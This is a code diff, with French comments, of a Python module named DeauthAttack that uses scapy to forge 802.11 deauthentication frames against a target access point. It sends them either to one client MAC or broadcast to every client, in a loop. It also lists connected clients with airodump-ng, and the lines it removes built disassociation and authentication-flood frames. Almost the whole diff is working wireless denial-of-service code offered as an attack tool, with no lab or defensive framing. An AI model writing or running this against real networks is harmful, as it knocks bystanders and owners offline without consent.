@@ -2,14 +2,15 @@
 # -*- coding: utf-8 -*-
 """
 Module Deauth Attack
-Implémente les attaques de déconnexion WiFi
+Attaque de déconnexion WiFi
 """
 
 import os
 import time
 import threading
+import subprocess
 from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, Dot11Auth
+from scapy.layers.dot11 import Dot11, Dot11Deauth
 
 class DeauthAttack:
     """Classe pour l'attaque Deauth"""
@@ -31,12 +32,14 @@ class DeauthAttack:
         self.setup_interface()
         
         # Démarrage du thread d'attaque
-        self.start_attack_thread()
+        self.attack_thread = threading.Thread(target=self.send_deauth_packets)
+        self.attack_thread.daemon = True
+        self.attack_thread.start()
         
     def setup_interface(self):
         """Configure l'interface WiFi pour l'attaque"""
         interface = self.config['interface']
-        channel = self.config['channel']
+        channel = self.config.get('channel', 1)
         
         try:
             # Mise en mode monitor
@@ -52,132 +55,116 @@ class DeauthAttack:
             self.logger.log("ERROR", f"Erreur lors de la configuration de l'interface: {str(e)}")
             raise
             
-    def start_attack_thread(self):
-        """Démarre le thread d'attaque"""
-        self.attack_thread = threading.Thread(target=self.send_deauth_packets)
-        self.attack_thread.daemon = True
-        self.attack_thread.start()
-        
     def send_deauth_packets(self):
-        """Envoie les paquets de déconnexion"""
+        """Envoie des paquets deauth"""
         interface = self.config['interface']
         target_bssid = self.config['target_bssid']
-        attack_type = self.config['attack_type']
-        packet_count = self.config['packet_count']
-        interval = self.config['interval'] / 1000.0  # Conversion en secondes
-        broadcast = self.config['broadcast']
-        continuous = self.config['continuous']
+        client_mac = self.config.get('client_mac', None)
+        packet_count = self.config.get('packet_count', 10)
+        interval = self.config.get('interval', 1.0)
         
-        self.logger.log("INFO", f"Envoi de paquets {attack_type} vers {target_bssid}")
-        
-        packets_sent = 0
+        self.logger.log("INFO", f"Envoi de paquets deauth vers {target_bssid}")
         
         while self.running:
             try:
-                # Création du paquet selon le type d'attaque
-                if attack_type == "Deauth":
-                    packet = self.create_deauth_packet(target_bssid, broadcast)
-                elif attack_type == "Disassoc":
-                    packet = self.create_disassoc_packet(target_bssid, broadcast)
-                elif attack_type == "Auth":
-                    packet = self.create_auth_packet(target_bssid, broadcast)
+                if client_mac:
+                    # Deauth vers un client spécifique
+                    self.send_deauth_to_client(interface, target_bssid, client_mac, packet_count)
                 else:
-                    packet = self.create_deauth_packet(target_bssid, broadcast)
+                    # Deauth broadcast
+                    self.send_broadcast_deauth(interface, target_bssid, packet_count)
                 
-                # Envoi du paquet
-                sendp(packet, iface=interface, verbose=False)
-                packets_sent += 1
-                
-                self.logger.log("DEBUG", f"Paquet {attack_type} #{packets_sent} envoyé")
-                
-                # Vérification du nombre de paquets
-                if not continuous and packets_sent >= packet_count:
-                    self.logger.log("INFO", f"Attaque terminée - {packets_sent} paquets envoyés")
-                    break
-                    
-                # Attente entre les paquets
                 time.sleep(interval)
                 
             except Exception as e:
-                self.logger.log("ERROR", f"Erreur lors de l'envoi de paquets: {str(e)}")
+                self.logger.log("ERROR", f"Erreur lors de l'envoi deauth: {str(e)}")
                 break
                 
-    def create_deauth_packet(self, target_bssid, broadcast=False):
-        """Crée un paquet deauth"""
-        if broadcast:
-            # Attaque broadcast - déconnecte tous les clients
-            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
-        else:
-            # Attaque ciblée - nécessite une liste de clients
-            # Pour la démo, on utilise broadcast
-            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
-            
-        return packet
-        
-    def create_disassoc_packet(self, target_bssid, broadcast=False):
-        """Crée un paquet disassoc"""
-        if broadcast:
-            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Disas()
-        else:
-            packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Disas()
-            
-        return packet
-        
-    def create_auth_packet(self, target_bssid, broadcast=False):
-        """Crée un paquet auth (pour les attaques de type auth flood)"""
-        if broadcast:
-            packet = Dot11(addr1=target_bssid, addr2="00:11:22:33:44:55", addr3=target_bssid) / Dot11Auth()
-        else:
-            packet = Dot11(addr1=target_bssid, addr2="00:11:22:33:44:55", addr3=target_bssid) / Dot11Auth()
-            
-        return packet
-        
-    def get_connected_clients(self, target_bssid):
-        """Récupère la liste des clients connectés au réseau cible"""
-        clients = []
-        
+    def send_deauth_to_client(self, interface, bssid, client_mac, count):
+        """Envoie des paquets deauth vers un client spécifique"""
         try:
-            # Utilisation de airodump-ng pour détecter les clients
-            interface = self.config['interface']
+            # Paquet deauth (code 1: STA_LEAVING)
+            deauth_packet = (
+                Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) /
+                Dot11Deauth(reason=1)
+            )
             
-            # Démarrage de airodump-ng en arrière-plan
-            cmd = ['airodump-ng', '--bssid', target_bssid, '--output-format', 'csv', 
-                   '--write', '/tmp/deauth_clients', interface]
-            
-            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Attente pour la capture
-            time.sleep(5)
-            
-            # Arrêt du processus
-            process.terminate()
-            process.wait()
-            
-            # Lecture du fichier de sortie
-            if os.path.exists('/tmp/deauth_clients-01.csv'):
-                with open('/tmp/deauth_clients-01.csv', 'r') as f:
-                    lines = f.readlines()
+            # Envoi des paquets
+            for i in range(count):
+                if not self.running:
+                    break
                     
-                for line in lines:
-                    if line.strip() and ',' in line:
-                        parts = line.split(',')
-                        if len(parts) > 1 and parts[0].strip():
-                            mac = parts[0].strip()
-                            if mac and mac != 'Station MAC' and mac != target_bssid:
-                                clients.append(mac)
-                                
-        except Exception as e:
-            self.logger.log("ERROR", f"Erreur lors de la détection des clients: {str(e)}")
+                sendp(deauth_packet, iface=interface, verbose=False)
+                time.sleep(0.1)
+                
+            self.logger.log("INFO", f"{count} paquets deauth envoyés vers {client_mac}")
             
-        return clients
-        
+        except Exception as e:
+            self.logger.log("ERROR", f"Erreur deauth client: {str(e)}")
+            
+    def send_broadcast_deauth(self, interface, bssid, count):
+        """Envoie des paquets deauth broadcast"""
+        try:
+            # Paquet deauth broadcast
+            deauth_packet = (
+                Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
+                Dot11Deauth(reason=1)
+            )
+            
+            # Envoi des paquets
+            for i in range(count):
+                if not self.running:
+                    break
+                    
+                sendp(deauth_packet, iface=interface, verbose=False)
+                time.sleep(0.1)
+                
+            self.logger.log("INFO", f"{count} paquets deauth broadcast envoyés")
+            
+        except Exception as e:
+            self.logger.log("ERROR", f"Erreur deauth broadcast: {str(e)}")
+    
+    def get_connected_clients(self, bssid, interface):
+        """Récupère la liste des clients connectés"""
+        try:
+            clients = []
+            
+            # Utilisation d'aircrack-ng pour détecter les clients
+            cmd = ['airodump-ng', '--bssid', bssid, '--channel', '1', '--output-format', 'csv', interface]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0:
+                lines = result.stdout.split('\n')
+                
+                for line in lines:
+                    if ',' in line and bssid not in line:
+                        parts = line.split(',')
+                        if len(parts) >= 6:
+                            client_mac = parts[0].strip()
+                            if client_mac and client_mac != 'Station MAC':
+                                clients.append({
+                                    'mac': client_mac,
+                                    'first_seen': parts[1].strip(),
+                                    'last_seen': parts[2].strip(),
+                                    'power': parts[3].strip(),
+                                    'packets': parts[4].strip(),
+                                    'bssid': parts[5].strip()
+                                })
+            
+            return clients
+            
+        except Exception as e:
+            self.logger.log("ERROR", f"Erreur clients connectés: {str(e)}")
+            return []
+    
     def stop(self):
         """Arrête l'attaque Deauth"""
         self.running = False
         
         # Arrêt du thread
         if self.attack_thread:
-            self.attack_thread.join(timeout=1)
+            self.attack_thread.join(timeout=2)
             
         # Nettoyage
         self.cleanup()
@@ -188,21 +175,8 @@ class DeauthAttack:
         """Nettoie les ressources utilisées"""
         try:
             # Retour en mode managed
-            self.network_manager.set_managed_mode(self.config['interface'])
-            
-            # Suppression des fichiers temporaires
-            if os.path.exists('/tmp/deauth_clients-01.csv'):
-                os.remove('/tmp/deauth_clients-01.csv')
+            if hasattr(self, 'config'):
+                self.network_manager.set_managed_mode(self.config['interface'])
                 
         except Exception as e:
-            self.logger.log("ERROR", f"Erreur lors du nettoyage: {str(e)}")
-            
-    def get_attack_stats(self):
-        """Retourne les statistiques de l'attaque"""
-        return {
-            'running': self.running,
-            'target_bssid': self.config.get('target_bssid', ''),
-            'attack_type': self.config.get('attack_type', ''),
-            'packet_count': self.config.get('packet_count', 0),
-            'interval': self.config.get('interval', 0)
-        } 
+            self.logger.log("ERROR", f"Erreur lors du nettoyage: {str(e)}") 
